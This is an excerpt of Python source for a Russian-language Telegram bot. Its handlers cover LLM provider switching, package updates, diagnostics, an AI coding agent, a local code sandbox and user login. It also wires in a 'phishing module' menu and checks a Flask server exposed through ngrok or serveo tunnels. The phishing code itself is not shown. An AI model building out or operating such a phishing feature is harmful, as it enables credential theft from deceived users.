                rows.append([btn(f"{m}{cur}", f"llm_setmodel:{prov}:{m}")])
            rows.append([back_btn("menu_llm")])
            edit_message(chat_id, msg_id,
                f"🔄 <b>Модели {prov}:</b>\nТекущая: <code>{config.LLM_MODEL}</code>",
                reply_markup=kb(*rows))



    elif action == 'update':
        answer_callback(cb_id)
        if arg == 'pip':
            send_message("📦 Обновляю зависимости...", chat_id)
            def _do_pip():
                import subprocess as _sp
                reqs = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'requirements.txt')
                flags = ['--break-system-packages'] if os.path.exists('/data/data/com.termux') else []
                cmd = ['pip', 'install', '--upgrade', '-r', reqs] + flags
                r = _sp.run(cmd, capture_output=True, text=True, timeout=120)
                lines = (r.stdout + r.stderr).strip().splitlines()
                # Берём последние 20 строк
                summary = '\n'.join(lines[-20:]) if lines else 'нет вывода'
                msg = "✅ <b>pip обновление завершено</b>\n<pre>{}</pre>".format(
                    summary[:2000].replace('<','&lt;').replace('>','&gt;'))
                send_message(msg, chat_id, reply_markup=kb([btn("◀️ Обновление", "menu_update")]))
            _run_in_thread(_do_pip)

        elif arg == 'ytdlp':
            send_message("🤖 Обновляю yt-dlp...", chat_id)
            def _do_ytdlp():
                import subprocess as _sp
                flags = ['--break-system-packages'] if os.path.exists('/data/data/com.termux') else []
                r = _sp.run(['pip', 'install', '--upgrade', 'yt-dlp'] + flags,
                            capture_output=True, text=True, timeout=60)
                out = (r.stdout + r.stderr).strip()
                ver_r = _sp.run(['yt-dlp', '--version'], capture_output=True, text=True)
                ver = ver_r.stdout.strip()
                send_message(f"✅ yt-dlp обновлён!\nВерсия: <b>{ver}</b>",
                             chat_id, reply_markup=kb([btn("◀️ Обновление", "menu_update")]))
            _run_in_thread(_do_ytdlp)

        elif arg == 'llm_scan':
            send_message("🔍 Сканирую бесплатные LLM...", chat_id)
            def _do_scan():
                from llm_checker import check_all_providers
                results = check_all_providers()
                ok = [r for r in results if r.get('ok')]
                lines = [f"🆓 <b>Рабочие провайдеры ({len(ok)}/{len(results)}):</b>\n"]
                for r in ok:
                    lines.append(f"✅ {r.get('provider','?')} — {r.get('model','?')}")
                send_message('\n'.join(lines[:20]), chat_id,
                             reply_markup=kb([btn("◀️ Обновление", "menu_update"),
                                              btn("🧠 LLM меню", "menu_llm")]))
            _run_in_thread(_do_scan)

        elif arg == 'changelog':
            answer_callback(cb_id)
            send_message(
                "📋 <b>История изменений АВТОМУВИ v2.1</b>\n\n"
                "✅ <b>Последние добавления:</b>\n"
                "• 🎬 YouTube → MP3/MP4 с выбором формата\n"
                "• 📁 Файловый менеджер\n"
                "• 🤖 Агент-кодер: Sandbox, Bot Tools\n"
                "• 💬 ИИ-чат: веб-поиск, смена роли\n"
                "• 🎨 Генерация картинок (4 провайдера)\n"
                "• 📨 Отправка сообщений и рассылка\n"
                "• 🔑 Удобное добавление API ключей\n"
                "• 🔄 Менеджер обновлений\n"
                "• 🩺 Встроенная диагностика\n"
                "• 🐛 Фикс 409 конфликт инстансов\n"
                "• 🐛 Фикс BUTTON_DATA_INVALID (64б)\n"
                "• 🐛 Фикс list index out of range\n",
                chat_id, reply_markup=kb([btn("◀️ Обновление", "menu_update")]))

    # ══ ДИАГНОСТИКА ══════════════════════════════════════════════════
    elif action == 'selfcheck':
        answer_callback(cb_id)
        send_message("🩺 Запускаю диагностику...", chat_id)
        def _do_check():
            import subprocess as _sp, sys
            lines = ["🩺 <b>Диагностика АВТОМУВИ</b>\n"]

            # Python версия
            lines.append(f"🐍 Python: <b>{sys.version.split()[0]}</b>")

            # Платформа
            import platform
            lines.append(f"💻 Платформа: <b>{platform.system()} {platform.machine()}</b>")

            # yt-dlp
            try:
                r = _sp.run(['yt-dlp', '--version'], capture_output=True, text=True, timeout=5)
                lines.append(f"🎬 yt-dlp: ✅ <b>{r.stdout.strip()}</b>")
            except Exception:
                lines.append("🎬 yt-dlp: ❌ не установлен")

            # ffmpeg
            try:
                r = _sp.run(['ffmpeg', '-version'], capture_output=True, text=True, timeout=5)
                ver = r.stdout.splitlines()[0].split()[2] if r.stdout else '?'
                lines.append(f"🎵 ffmpeg: ✅ <b>{ver}</b>")
            except Exception:
                lines.append("🎵 ffmpeg: ⚠️ не найден (нужен для mp3)")

            # LLM статус
            provider = config.LLM_PROVIDER
            model    = config.LLM_MODEL
            lines.append(f"\n🧠 LLM: <b>{provider} / {model}</b>")

            # Ключи
            key_checks = [
                ('GROQ_API_KEY',       'Groq'),
                ('OPENAI_API_KEY',     'OpenAI'),
                ('GEMINI_API_KEY',     'Gemini'),
                ('ANTHROPIC_API_KEY',  'Claude'),
                ('OPENROUTER_API_KEY', 'OpenRouter'),
                ('CEREBRAS_API_KEY',   'Cerebras'),
                ('STABILITY_API_KEY',  'Stability'),
                ('HF_API_KEY',         'HuggingFace'),
            ]
            lines.append("\n🔑 <b>API ключи:</b>")
            for env_key, name in key_checks:
                val = os.environ.get(env_key, '') or getattr(config, env_key, '')
                if val:
                    short = val[:8] + '...'
                    lines.append(f"  ✅ {name}: <code>{short}</code>")
                else:
                    lines.append(f"  ❌ {name}: нет ключа")

            # Flask
            try:
                import fish_bot_state as _fbs
                flask_ok = _fbs.server_running
                tunnel   = _fbs.tunnel_url or _fbs.bore_url or _fbs.ngrok_url or _fbs.serveo_url
                lines.append(f"\n🎣 Flask: {'✅ работает' if flask_ok else '❌ не запущен'}")
                lines.append(f"🚇 Туннель: {tunnel or '❌ нет'}")
            except Exception:
                pass

            # Дисковое место
            try:
                st = os.statvfs(os.path.expanduser('~')) if hasattr(os, 'statvfs')                      else None
                if st:
                    free_mb = st.f_bavail * st.f_frsize // 1024 // 1024
                    lines.append(f"\n💾 Свободно: <b>{free_mb} MB</b>")
            except Exception:
                pass

            send_message('\n'.join(lines), chat_id,
                reply_markup=kb(
                    [btn("🧪 Тест LLM", "test"),
                     btn("🔄 Обновление", "menu_update")],
                    [back_btn()],
                ))
        _run_in_thread(_do_check)

    elif action == 'agent_end':
        info = session_info(chat_id)
        end_session(chat_id)
        answer_callback(cb_id, "✅ Сессия завершена")
        msgs = info['messages'] if info else 0
        elapsed = info['elapsed'] if info else '—'
        edit_message(chat_id, msg_id,
            "✅ <b>Сессия завершена</b>\n"
            "Сообщений: {} | Время: {}".format(msgs, elapsed),
            reply_markup=menu_keyboard())

    elif action == 'agent_clear':
        sess = get_session(chat_id)
        if sess:
            sess['history'].clear()
        answer_callback(cb_id, "🗑 История очищена")
        send_message("🗑 История диалога очищена.", chat_id,
                    reply_markup=chat_control_keyboard())

    elif action == 'agent_status':
        info = session_info(chat_id)
        if info:
            mode_name = "💬 Чат" if info['mode'] == 'chat' else "💻 Кодер"
            answer_callback(cb_id,
                "{} | {} сообщ. | {}".format(mode_name, info['messages'], info['elapsed']))
        else:
            answer_callback(cb_id, "Нет активной сессии")

    elif action == 'agent_help':
        answer_callback(cb_id)
        edit_message(chat_id, msg_id,
            "ℹ️ <b>Как пользоваться ИИ-агентом</b>\n\n"
            "<b>💬 Чат-режим:</b>\n"
            "Просто пишешь сообщения боту — он отвечает как ChatGPT.\n"
            "История сохраняется в рамках сессии.\n"
            "Команды: /chat для запуска, /endchat для завершения.\n\n"
            "<b>💻 Агент-кодер:</b>\n"
            "Описываешь задачу словами.\n"
            "Агент генерирует Python-код, запускает его (таймаут 30с), показывает вывод.\n"
            "Если код падает — сам исправляет (до 4 попыток).\n"
            "Команды: /code для запуска.\n\n"
            "<b>⚠️ Важно:</b> Код выполняется локально на твоём сервере.\n"
            "Используй только для доверенных задач.",
            reply_markup=kb(
                [btn("💬 Начать чат", "agent_chat_start"),
                 btn("💻 Агент-кодер", "agent_code_start")],
                [back_btn("menu_agent")],
            ))

    # ── Выбор режима генерации проекта ───────────────────────
    elif action == 'proj_mode':
        pending = _pending_agent_task.pop(chat_id, None)
        if not pending:
            answer_callback(cb_id, "❌ Задача не найдена", alert=True)
            return

        if arg == 'cancel':
            answer_callback(cb_id, "❌ Отменено")
            edit_message(chat_id, msg_id, "❌ Генерация отменена.",
                         reply_markup=chat_control_keyboard())
            return

        mode_labels = {
            'plan':      '🧩 Двухэтапный план',
            'onebyone':  '📄 Один файл за раз',
            'scaffold':  '🏗 Скаффолдер-скрипт',
        }
        label = mode_labels.get(arg, arg)
        answer_callback(cb_id, "{}  — запускаю!".format(label))
        edit_message(chat_id, msg_id,
            "⚙️ Режим: <b>{}</b>\nЗадача: <i>{}</i>\n\nГенерирую...".format(
                label, pending['task'][:100]),
            reply_markup=None)

        _run_in_thread(_run_code_task, chat_id, pending['task'], arg)

    # ── Действия с загруженным файлом (после анализа) ────────
    elif action == 'file_action':
        pending = _pending_file.get(chat_id)

        if arg == 'close':
            _pending_file.pop(chat_id, None)
            answer_callback(cb_id, "Закрыто")
            edit_message(chat_id, msg_id, "📁 Файл закрыт. Продолжай работу.",
                         reply_markup=chat_control_keyboard())
            return

        if arg == 'custom':
            answer_callback(cb_id, "Напиши свой запрос 👇")
            edit_message(chat_id, msg_id,
                "✏️ <b>Напиши что сделать с файлом</b>\n"
                "Файл: <code>{}</code>".format(
                    pending['filename'] if pending else 'неизвестен'),
                reply_markup=kb([btn("❌ Отмена", "file_action:close")]))
            # _pending_file остаётся — следующий текст попадёт в агент с файлом
            _wait_state[chat_id] = 'file_custom_input'
            return

        if not pending:
            answer_callback(cb_id, "❌ Файл не найден. Загрузи снова.", alert=True)
            return

        action_map = {
            'review':  ("🔍 Ищу ошибки и проблемы...", "review",
                        "Проанализируй код, найди все ошибки, баги, проблемы безопасности. "
                        "Верни исправленную версию."),
            'fix':     ("🔧 Исправляю ошибки...", "fix",
                        "Найди и исправь все ошибки в коде. Верни полный исправленный файл."),
            'explain': ("📖 Объясняю код...", "review",
                        "Подробно объясни что делает этот код: архитектуру, логику, "
                        "основные функции. На русском языке."),
            'improve': ("🚀 Улучшаю код...", "fix",
                        "Улучши и расшири код: оптимизируй, добавь обработку ошибок, "
                        "улучши читаемость. Верни улучшенную версию."),
            'build':   ("🏗 Создаю на основе этого...", "plan",
                        "Используй этот код как основу и создай расширенный проект "
                        "с дополнительным функционалом."),
        }

        if arg not in action_map:
            answer_callback(cb_id, "❓ Неизвестное действие")
            return

        status_msg, proj_mode, task_prompt = action_map[arg]
        filename_f = pending['filename']

        answer_callback(cb_id, status_msg)
        edit_message(chat_id, msg_id,
            "⚙️ <b>{}</b>\nФайл: <code>{}</code>".format(status_msg, filename_f),
            reply_markup=None)

        # Читаем содержимое файла для передачи в агент
        try:
            with open(pending['path'], 'r', encoding='utf-8', errors='ignore') as f:
                file_content = f.read()
        except Exception as e:
            file_content = pending['analysis']  # fallback на анализ

        full_task = "{}\n\nФайл: {}\n\n```\n{}\n```".format(
            task_prompt, filename_f, file_content[:8000])

        _pending_file.pop(chat_id, None)

        def _do_file_action():
            _run_code_task(chat_id, full_task, proj_mode=proj_mode if proj_mode != 'plan' else None)
        _run_in_thread(_do_file_action)

    elif action == 'llm_check':
        answer_callback(cb_id)
        edit_message(chat_id, msg_id,
            "⏳ Проверяю {} провайдеров...".format(len(__import__('llm_checker').PROVIDERS) + 1),
            reply_markup=None)

        def _do_check():
            results = check_all(api_key=config.LLM_API_KEY)
            text = format_check_results(results)
            # Кнопки с рабочими провайдерами
            ok_providers = [r['name'] for r in results if r['ok']]
            rows = []
            for i in range(0, len(ok_providers), 2):
                row = [btn("✅ {}".format(p), "llm_use:{}".format(p))
                       for p in ok_providers[i:i+2]]
                rows.append(row)
            rows.append([back_btn("menu_llm")])
            send_message(text, chat_id, reply_markup=kb(*rows) if rows else None)

        _run_in_thread(_do_check)

    elif action == 'llm_pick':
        # Нажата кнопка провайдера из /llm меню
        provider = arg
        answer_callback(cb_id, "✅ {}".format(provider))
        from llm_checker import RECOMMENDED
        rec = RECOMMENDED.get(provider, [])

        # Применяем провайдер сразу с дефолтной моделью
        default_model = rec[0] if rec else config.LLM_MODEL
        config.LLM_PROVIDER = provider
        config.LLM_MODEL = default_model

        if rec:
            # Показываем выбор модели
            rows = []
            for i in range(0, min(len(rec), 8), 2):
                row = [btn(rec[j], "llm_setmodel:{}:{}".format(provider, rec[j]))
                       for j in range(i, min(i+2, len(rec)))]
                rows.append(row)
            rows.append([btn("✅ Оставить {}".format(default_model[:20]),
                            "llm_confirm:{}:{}".format(provider, default_model))])
            edit_message(chat_id, msg_id,
                "✅ Провайдер: <b>{}</b>\n\nВыбери модель:".format(provider),
                reply_markup=kb(*rows))
        else:
            # Нет рекомендаций — просто применяем
            edit_message(chat_id, msg_id,
                "✅ Провайдер: <b>{}</b>\nМодель: <code>{}</code>".format(
                    provider, default_model),
                reply_markup=kb([btn("◀️ Меню", "menu_llm")]))

    elif action == 'llm_setmodel':
        # arg = "provider:model"
        parts = arg.split(':', 1)
        if len(parts) == 2:
            provider, model = parts
            config.LLM_PROVIDER = provider
            config.LLM_MODEL = model
            answer_callback(cb_id, "✅ {}/{}".format(provider, model[:20]))
            edit_message(chat_id, msg_id,
                "✅ Провайдер: <b>{}</b>\nМодель: <code>{}</code>".format(provider, model),
                reply_markup=kb(
                    [btn("🧪 Тест", "test")],
                    [btn("◀️ Назад", "menu_llm")]
                ))
        else:
            answer_callback(cb_id, "❌ Ошибка", alert=True)

    elif action == 'llm_confirm':
        parts = arg.split(':', 1)
        provider, model = (parts[0], parts[1]) if len(parts) == 2 else (arg, config.LLM_MODEL)
        config.LLM_PROVIDER = provider
        config.LLM_MODEL = model
        answer_callback(cb_id, "✅ Сохранено")
        edit_message(chat_id, msg_id,
            "✅ Провайдер: <b>{}</b>\nМодель: <code>{}</code>".format(provider, model),
            reply_markup=kb(
                [btn("🧪 Тест", "test")],
                [btn("◀️ Назад", "menu_llm")]
            ))

    elif action == 'llm_use':
        # Быстрое переключение на провайдер из результатов проверки
        provider = arg
        recommended = RECOMMENDED.get(provider, [])
        default_model = recommended[0] if recommended else config.LLM_MODEL
        config.LLM_PROVIDER = provider
        config.LLM_MODEL = default_model
        answer_callback(cb_id, "✅ Переключено на {}".format(provider))
        edit_message(chat_id, msg_id,
            "✅ Провайдер: <b>{}</b>\nМодель: <code>{}</code>\n\n"
            "Проверяю доступность...".format(provider, default_model),
            reply_markup=None)
        result = check_provider(provider, config.LLM_API_KEY)
        if result['ok']:
            models = result['models'] or result['recommended']
            rows = [[btn(m, "setmodel:{}".format(m))] for m in models[:6]]
            rows.append([back_btn("llm_check")])
            send_message(
                "🟢 <b>{}</b> работает!\n\nДоступные модели — выбери:".format(provider),
                chat_id, reply_markup=kb(*rows))
        else:
            send_message("🔴 Провайдер {} недоступен: {}".format(provider, result['error']),
                        chat_id, reply_markup=kb([back_btn("llm_check")]))

    elif action == 'setmodel':
        config.LLM_MODEL = arg
        answer_callback(cb_id, "✅ Модель: {}".format(arg))
        send_message("✅ Модель установлена: <code>{}</code>".format(arg), chat_id,
                    reply_markup=llm_keyboard())

    # ── Авто-поиск моделей ────────────────────────────────────
    elif action == 'models_discover':
        answer_callback(cb_id)
        edit_message(chat_id, msg_id,
            "🔍 Определяю провайдер и ищу доступные модели...",
            reply_markup=None)

        def _discover():
            provider = config.LLM_PROVIDER.lower()
            key      = config.LLM_API_KEY

            if provider == 'openrouter':
                models, err = get_openrouter_models_cached(key, force=True)
                if err:
                    send_message("❌ Ошибка OpenRouter: {}".format(err), chat_id,
                                reply_markup=kb([back_btn("menu_llm")]))
                    return
                summary = format_models_summary(models, "OpenRouter ({})".format(len(models)))
                send_message(summary, chat_id)
                # Показываем бесплатные постранично
                _show_models_page(chat_id, models, page=0)

            elif provider == 'ollama':
                models, err = fetch_ollama_models()
                if err or not models:
                    send_message("❌ Ollama не запущена или нет моделей.\n"
                                 "Запусти: <code>ollama pull llama3.2</code>", chat_id,
                                 reply_markup=kb([back_btn("menu_llm")]))
                    return
                    return
                rows = [[btn(m['id'], 'usemodel:ollama:{}'.format(m['id']))]
                        for m in models]
                rows.append([back_btn("menu_llm")])
                send_message(
                    "🦙 <b>Ollama — локальные модели ({}шт.):</b>".format(len(models)),
                    chat_id, reply_markup=kb(*rows))

            else:
                # Любой другой провайдер — пробуем /v1/models
                from llm_checker import PROVIDERS
                info = PROVIDERS.get(provider, {})
                base_url = info.get('url', '').replace('/models', '').replace('/api/tags', '')
                models, err = fetch_any_provider_models(base_url, key, provider)
                if err or not models:
                    # Показываем рекомендованные
                    from llm_checker import RECOMMENDED
                    rec = RECOMMENDED.get(provider, [])
                    if rec:
                        rows = [[btn(m, 'usemodel:{}:{}'.format(provider, m))] for m in rec]
                        rows.append([back_btn("menu_llm")])
                        send_message(
                            "📋 <b>{}</b> — рекомендуемые модели:".format(provider),
                            chat_id, reply_markup=kb(*rows))
                    else:
                        send_message(
                            "⚠️ Не удалось получить модели для <b>{}</b>.\n"
                            "Попробуй переключиться на <b>openrouter</b> для 300+ моделей.".format(provider),
                            chat_id, reply_markup=kb(
                                [btn("🌐 Переключить на OpenRouter", "provider_set:openrouter")],
                                [back_btn("menu_llm")]))
                    return

                rows = [[btn(m['id'][:40], 'usemodel:{}:{}'.format(provider, m['id']))]
                        for m in models[:15]]
                rows.append([back_btn("menu_llm")])
                send_message(
                    "📋 <b>{}</b> — доступные модели ({}шт.):".format(provider, len(models)),
                    chat_id, reply_markup=kb(*rows))

        _run_in_thread(_discover)

    elif action == 'models_page':
        answer_callback(cb_id)
        page = int(arg) if arg.isdigit() else 0
        models, _ = get_openrouter_models_cached(config.LLM_API_KEY)
        if models:
            _show_models_page(chat_id, models, page, msg_id=msg_id)
        else:
            answer_callback(cb_id, "❌ Нет кэша моделей", alert=True)

    elif action == 'usemodel':
        # arg = "provider:model_id"
        parts = arg.split(':', 1)
        if len(parts) == 2:
            provider, model_id = parts
            config.LLM_PROVIDER = provider
            config.LLM_MODEL    = model_id
            answer_callback(cb_id, "✅ {}  {}".format(provider, model_id[:30]))
            send_message(
                "✅ Переключено:\nПровайдер: <b>{}</b>\nМодель: <code>{}</code>".format(
                    provider, model_id),
                chat_id, reply_markup=llm_keyboard())
        else:
            answer_callback(cb_id, "❌ Неверный формат", alert=True)

    elif action == 'provider_set':
        config.LLM_PROVIDER = arg
        answer_callback(cb_id, "✅ Провайдер: {}".format(arg))
        send_message(
            "✅ Провайдер: <b>{}</b>\n\nВведи ключ командой:\n"
            "<code>/setllm {} MODEL ВАШ_КЛЮЧ</code>\n\n"
            "Или открой 🌐 Все модели для поиска.".format(arg, arg),
            chat_id, reply_markup=llm_keyboard())

    elif action == 'quickllm':
        # arg = "provider:model"
        parts = arg.split(':', 1)
        if len(parts) == 2:
            provider, model = parts
            config.LLM_PROVIDER = provider
            config.LLM_MODEL = model
            answer_callback(cb_id, "✅ {} / {}".format(provider, model[:30]))
            edit_message(chat_id, msg_id,
                "✅ Провайдер: <b>{}</b>\nМодель: <code>{}</code>\n\n"
                "Ключ берётся из .env автоматически.\n"
                "Если нет ключа — добавь <code>{}_API_KEY=...</code>".format(
                    provider, model, provider.upper()),
                reply_markup=kb([btn("🧪 Тест", "llm_test"), btn("◀️ Назад", "menu_llm")]))
        else:
            answer_callback(cb_id, "❌ Ошибка", alert=True)

    elif action == 'noop':
        answer_callback(cb_id)

    # ── 🎣 Фишинг-модуль callbacks ────────────────────────────
    elif action == 'menu_fish':
        answer_callback(cb_id)
        edit_message(chat_id, msg_id, "🎣 <b>Фишинг-модуль</b>",
                     reply_markup=fish_menu_keyboard())

    elif action == 'fish':
        # fish:action — delegate to fish handler
        answer_callback(cb_id)
        _fish_handle_action(arg, chat_id)

    elif action == 'fish_selfile':
        # fish_selfile:file_id
        answer_callback(cb_id)
        _fish_handle_selfile(arg, chat_id)

    elif action == 'fish_opt':
        # fish_opt:toggle_name
        answer_callback(cb_id)
        _fish_handle_opt(arg, chat_id)


    elif action == 'llm_test':
        answer_callback(cb_id)
        def _do_test():
            from llm_client import test_connection
            ok, msg = test_connection()
            ms, err = 0, msg
            if ok:
                send_message("✅ LLM работает! {}/{} — {}мс".format(
                    config.LLM_PROVIDER, config.LLM_MODEL, ms), chat_id,
                    reply_markup=kb([back_btn("menu_llm")]))
            else:
                send_message("❌ {} — {}".format(config.LLM_PROVIDER, err), chat_id,
                    reply_markup=kb([btn("🔍 Проверить все", "llm_check"), back_btn("menu_llm")]))
        _run_in_thread(_do_test)

    elif action == 'cancel_wait':
        _wait_state.pop(chat_id, None)
        answer_callback(cb_id, "❌ Отменено")
        edit_message(chat_id, msg_id, "❌ Отменено.", reply_markup=menu_keyboard())

    else:
        answer_callback(cb_id, "❓ Неизвестная кнопка: {}".format(action), alert=True)





# ════════════════════════════════════════════════════════════
#  👤 AUTH v2 — Регистрация, логин, сессии, агент
# ════════════════════════════════════════════════════════════

def auth_menu_keyboard():
    return kb(
        [btn("📝 Регистрация",   "auth_register"),
         btn("🔑 Войти",         "auth_login")],
        [btn("👤 Мой профиль",   "auth_me"),
         btn("🔐 Добавить ключ", "auth_setkey")],
        [back_btn("menu")],
    )

def agent_v2_keyboard():
    return kb(
        [btn("🤖 Запустить задачу", "agentv2_run")],
        [btn("🐍 Sandbox: выполнить код", "agentv2_sandbox")],
        [btn("📁 Мои файлы", "agentv2_files")],
        [btn("🗑 Очистить историю чата", "agentv2_clear")],
        [back_btn("menu")],
    )

def _auth_guard(chat_id) -> bool:
    """True если пользователь авторизован, иначе шлёт сообщение."""
    if not AUTH_ENABLED:
        send_message("⚠️ Auth модуль не загружен", chat_id)
        return False
    if not _auth.is_registered(int(chat_id)):
        send_message(
            "🔐 Нужна регистрация\n\n"
            "Нажми 👤 Регистрация / Вход в меню или /register",
            chat_id,
            reply_markup=auth_menu_keyboard()
        )
        return False
    return True

def _auth_limit_guard(chat_id) -> bool:
    if not _auth.check_limit(int(chat_id)):
        plan = _auth.get_plan(int(chat_id))
        send_message(
            f"⚠️ Лимит: {plan['used']}/{plan['daily_limit']} запросов сегодня.\n"
            "Обновится завтра.",
            chat_id
        )
        return False
    return True

# ── Auth callback handlers ─────────────────────────────────────

def _handle_auth_callback(action, arg, cb_id, chat_id, msg_id):
    """Возвращает True если обработал, False если нет."""

    if action == 'menu_auth':
        edit_message(chat_id, msg_id,
            "👤 <b>Аккаунт</b>\n\n"
            "Регистрация даёт: индивидуальные сессии, свои API ключи, лимиты.",
            reply_markup=auth_menu_keyboard())
        answer_callback(cb_id)
        return True

    if action == 'auth_register':
        if AUTH_ENABLED and _auth.is_registered(int(chat_id)):
            answer_callback(cb_id, "✅ Уже зарегистрирован!")
            edit_message(chat_id, msg_id, _auth.user_info_text(int(chat_id)),
                         reply_markup=auth_menu_keyboard())
            return True
        _auth_wait[chat_id] = 'register_pass'
        answer_callback(cb_id)
        send_message(
            "🔐 <b>Регистрация</b>\n\n"
            "Придумай пароль (мин. 6 символов):\n"
            "<i>Просто напиши следующим сообщением</i>",
            chat_id)
        return True

    if action == 'auth_login':
        if not AUTH_ENABLED:
            answer_callback(cb_id, "⚠️ Auth недоступен")
            return True
        _auth_wait[chat_id] = 'login_pass'
        answer_callback(cb_id)
        send_message("🔑 Введи пароль:", chat_id)
        return True

    if action == 'auth_me':
        if not _auth_guard(chat_id):
            answer_callback(cb_id)
            return True
        text = _auth.user_info_text(int(chat_id))
        edit_message(chat_id, msg_id, text, reply_markup=auth_menu_keyboard())
        answer_callback(cb_id)
        return True

    if action == 'auth_setkey':
        if not _auth_guard(chat_id):
            answer_callback(cb_id)
            return True
        _auth_wait[chat_id] = 'setkey_provider'
        answer_callback(cb_id)
        send_message("🔑 Для какого провайдера ключ? (groq/gemini/openai/...):", chat_id)
        return True

    # ── Agent v2
    if action == 'menu_agent_v2':
        edit_message(chat_id, msg_id,
            "🤖 <b>AI Агент v2</b>\n\n"
            "Выполняю задачи с инструментами:\n"
            "• TTS (озвучка текста)\n"
            "• Генерация картинок\n"
            "• Поиск в интернете\n"
            "• Python sandbox\n"
            "• Сборка видео\n"
            "• Создание ботов (/gen)\n\n"
            "Примеры: <i>Озвучь текст: Привет!</i>\n"
            "<i>Найди последние новости об AI</i>\n"
            "<i>Напиши скрипт для скачивания файлов</i>",
            reply_markup=agent_v2_keyboard())
        answer_callback(cb_id)
        return True

    if action == 'agentv2_run':
        if not _auth_guard(chat_id) or not _auth_limit_guard(chat_id):
            answer_callback(cb_id)
            return True
        _wait_state[chat_id] = 'agentv2_task'
        answer_callback(cb_id)
        send_message("📝 Напиши задачу для агента:", chat_id)
        return True

    if action == 'agentv2_sandbox':
        if not AUTH_ENABLED:
            answer_callback(cb_id, "⚠️ Sandbox недоступен")
            return True
        if AUTH_ENABLED:
            plan = _auth.get_plan(int(chat_id))
            if not plan.get('sandbox') and plan.get('plan') != 'admin':
                answer_callback(cb_id, "⚠️ Sandbox доступен на Pro тарифе")
                return True
        _wait_state[chat_id] = 'agentv2_code'
        answer_callback(cb_id)
        send_message("🐍 <b>Python Sandbox</b>\n\nПришли код:", chat_id)
        return True

    if action == 'agentv2_files':
        if not _auth_guard(chat_id):
            answer_callback(cb_id)
            return True
        sess  = _sessions.get(int(chat_id))
        d     = sess.files_dir
        items = os.listdir(d) if os.path.exists(d) else []
        if not items:
            answer_callback(cb_id, "📭 Нет файлов")
            return True
        lines = ["📁 <b>Мои файлы:</b>"]
        for name in sorted(items)[:20]:
            sz = os.path.getsize(os.path.join(d, name)) // 1024
            lines.append(f"• {name} ({sz} KB)")
        edit_message(chat_id, msg_id, "\n".join(lines), reply_markup=agent_v2_keyboard())
        answer_callback(cb_id)
        return True

    if action == 'agentv2_clear':
        if AUTH_ENABLED and _auth.is_registered(int(chat_id)):
            _sessions.get(int(chat_id)).clear_history()
            _sessions.save(int(chat_id), force=True)
        answer_callback(cb_id, "🗑 История очищена")
        return True

    return False


# ── Auth wait_state handlers ───────────────────────────────────

def _handle_auth_wait(state, text, chat_id) -> bool:
    """Возвращает True если обработал состояние."""
    uid = int(chat_id)

    if state == 'register_pass':
        if len(text.strip()) < 6:
            send_message("❌ Пароль мин. 6 символов. Попробуй снова:", chat_id)
            _auth_wait[chat_id] = 'register_pass'
            return True
        try:
            from telegram_client import get_updates  # noqa — уже импортирован
            # Получаем username из config или из последнего апдейта
            username   = ''
            first_name = ''
            _auth.register(uid, username, first_name, text.strip())
            plan = _auth.get_plan(uid)
            send_message(
                f"✅ <b>Зарегистрирован!</b>\n\n"
                f"💎 Тариф: <b>{plan['plan']}</b>\n"
                f"📊 Лимит: {plan['daily_limit']} запросов/день\n\n"
                "Теперь доступны AI Агент v2 и персональные сессии!",
                chat_id,
                reply_markup=menu_keyboard()
            )
        except Exception as e:
            send_message(f"❌ {e}", chat_id)
        return True

    if state == 'login_pass':
        try:
            _auth.login(uid, text.strip())
            send_message("✅ Авторизован!", chat_id, reply_markup=menu_keyboard())
        except Exception as e:
            send_message(f"❌ {e}", chat_id)
        return True

    if state == 'setkey_provider':
        _auth_wait[chat_id] = 'setkey_value'
        _auth_data[chat_id]  = {'provider': text.strip().lower()}
        send_message(f"Введи ключ для <b>{text.strip()}</b>:", chat_id)
        return True

    if state == 'setkey_value':
        provider = _auth_data.pop(chat_id, {}).get('provider', 'unknown')
        _auth.set_user_api_key(uid, provider, text.strip())
        send_message(f"✅ Ключ для <b>{provider}</b> сохранён!", chat_id)
        return True

    if state == 'agentv2_task':
        if not _auth_limit_guard(chat_id):
            return True
        _run_agentv2_task(chat_id, text.strip())
        return True

    if state == 'agentv2_code':
        code = text.strip()
        if code.startswith('```'):
            lines = code.split('\n')
            code  = '\n'.join(lines[1:-1] if lines[-1] == '```' else lines[1:])
        _run_sandbox(chat_id, code)
        return True

    return False


# ── Agent v2 runner ────────────────────────────────────────────

def _run_agentv2_task(chat_id, task):
    sess = _sessions.get(int(chat_id)) if AUTH_ENABLED else None
    uid  = int(chat_id)

    status_id = [None]

    def _upd(text):
        if status_id[0] is None:
            r = send_message(text[:800], chat_id)
            if r and r.get('ok'):
                status_id[0] = r['result']['message_id']
        else:
            try:
                edit_message(chat_id, status_id[0], text[:800])
            except Exception:
                pass

    def _do():
        try:
            from llm_client import call_llm

            class _SimpleRouter:
                def chat(self, messages, **kw):
                    prompt = '\n\n'.join(
                        m['content'] for m in messages if m['role'] != 'system'
                    )
                    system = next((m['content'] for m in messages if m['role'] == 'system'), '')
                    return call_llm(prompt, system=system, max_tokens=kw.get('max_tokens', 2048))
                def chat_json(self, messages, **kw):
                    import json, re
                    raw = self.chat(messages, **kw)
                    clean = raw.strip()
                    for fence in ['```json', '```']:
                        if clean.startswith(fence):
                            clean = clean[len(fence):]
                            if clean.endswith('```'):
                                clean = clean[:-3]
                            clean = clean.strip()
                            break
                    try:
                        return json.loads(clean)
                    except Exception:
                        m = re.search(r'\{[\s\S]+\}', clean)
                        if m:
                            return json.loads(m.group(0))
                        raise ValueError(f"Не JSON: {raw[:200]}")

            router = _SimpleRouter()
            result = _run_agent(
                task=task, user_id=uid,
                session=sess, router=router,
                on_status=_upd,
            )
            if AUTH_ENABLED:
                _auth.increment_usage(uid)
                _sessions.save(uid)

            summary = result.get('summary', '✅ Готово')
            try:
                edit_message(chat_id, status_id[0], summary[:4000])
            except Exception:
                send_message(summary[:4000], chat_id)

            for fpath in result.get('files', []):
                if os.path.exists(fpath):
                    try:
                        send_document(chat_id, fpath, caption=os.path.basename(fpath))
                    except Exception:
                        pass
        except Exception as e:
            msg = f"❌ Ошибка агента: {e}"
            try:
                edit_message(chat_id, status_id[0], msg)
            except Exception:
                send_message(msg, chat_id)

    threading.Thread(target=_do, daemon=True).start()


def _run_sandbox(chat_id, code):
    uid  = int(chat_id)
    sess = _sessions.get(uid) if AUTH_ENABLED else None
    user_dir = sess.sandbox_dir if sess else '/tmp'
    wait_msg = send_message("⚙️ Выполняю...", chat_id)
